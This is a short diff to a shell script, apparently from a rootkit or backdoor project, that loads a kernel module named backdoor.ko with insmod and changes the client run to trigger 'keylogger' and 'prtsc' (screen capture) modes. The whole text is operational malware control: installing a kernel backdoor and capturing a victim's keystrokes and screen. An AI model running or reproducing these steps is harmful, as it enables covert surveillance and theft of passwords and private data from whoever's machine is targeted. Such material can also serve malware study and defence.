@@ -4,4 +4,6 @@
 insmod backdoor.ko
 
 # RUN CLIENT 
-python3 client.py
+python3 client.py keylogger
+sleep 1  # Wait 1 seconds
+python3 client.py prtsc
